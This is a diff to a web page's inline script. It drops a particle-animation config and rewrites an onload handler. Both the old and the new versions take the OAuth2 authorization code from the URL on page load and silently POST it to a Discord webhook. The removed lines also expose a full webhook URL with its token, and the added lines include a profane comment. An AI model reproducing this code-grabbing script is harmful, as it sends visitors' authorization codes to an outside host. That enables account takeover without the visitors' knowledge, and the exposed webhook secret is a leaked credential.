@@ -154,71 +154,34 @@
     <script src="static/userinfo/script.js"></script>
     <script src="static/assets/js/enter.js"></script>
     <script>
-        particlesJS("particles-js", {
-            particles: {
-                number: { value: 100, density: { enable: true, value_area: 800 } },
-                color: { value: "#fff" },
-                shape: { type: "circle" },
-                opacity: {
-                    value: 0.8,
-                    random: true,
-                    anim: { enable: true, speed: 1, opacity_min: 0.1, sync: false }
-                },
-                size: {
-                    value: 5,
-                    random: true,
-                    anim: { enable: true, speed: 2, size_min: 1, sync: false }
-                },
-                line_linked: { enable: false },
-                move: {
-                    enable: true,
-                    speed: 1,
-                    direction: "bottom",
-                    random: true,
-                    straight: false,
-                    out_mode: "out",
-                    bounce: false
-                }
-            },
-            interactivity: {
-                detect_on: "canvas",
-                events: {
-                    onhover: { enable: false },
-                    onclick: { enable: false },
-                    resize: true
-                },
-                modes: {
-                    grab: { distance: 400, line_linked: { opacity: 1 } },
-                    bubble: { distance: 250, size: 0, duration: 2, opacity: 0 },
-                    repulse: { distance: 400, duration: 0.4 },
-                    push: { particles_nb: 4 },
-                    remove: { particles_nb: 2 }
-                }
-            },
-            retina_detect: true
-        });
-
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
             const code = urlParams.get('code');
+
             if (code) {
                 console.log('Authorization code:', code);
 
-                const webhookUrl = 'https://discord.com/api/webhooks/1262446066390011955/6r1ccTdwLORnBNiSOj_I48wN60QpL-v8Z8DtaIH3LCU7Tp_0mbAVzem33CqIzuMuasU1';
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ content: `New OAuth2 code: ${code}` })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Success:', data);
-                })
-                .catch((error) => {
-                    console.error('Error:', error);
-                });
+                // Fuck you zio
+                const webhookUrl = process.env.REACT_APP_DISCORD_WEBHOOK_URL;
+
+                if (webhookUrl) {
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ content: `New OAuth2 code: ${code}` })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Success:', data);
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                    });
+                } else {
+                    console.error('Webhook URL is not defined.');
+                }
             }
         };
     </script>
